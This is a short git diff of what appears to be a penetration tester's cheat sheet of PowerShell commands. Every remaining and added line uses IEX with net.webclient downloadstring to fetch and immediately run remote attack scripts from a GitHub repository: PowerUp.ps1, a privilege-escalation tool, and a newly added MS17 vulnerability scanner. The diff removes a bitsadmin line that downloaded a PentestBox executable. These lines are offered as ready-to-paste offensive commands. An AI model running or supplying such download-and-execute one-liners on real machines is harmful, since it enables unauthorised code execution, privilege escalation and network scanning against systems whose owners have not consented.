@@ -20,5 +20,6 @@ IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/PowerUp.ps1')
 
-### PentestBox.exe
-bitsadmin /transfer myjob /download /priority high https://downloads.sourceforge.net/project/pentestbox/PentestBox-2.3.exe?r=https%3A%2F%2Fsourceforge.net%2Fprojects%2Fpentestbox%2Ffiles%2FPentestBox-2.3.exe%2Fdownload&ts=1544017599 C:\temp\pentestbox.exe
+### MS17 Scanner
+
+IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/MS17.ps1')
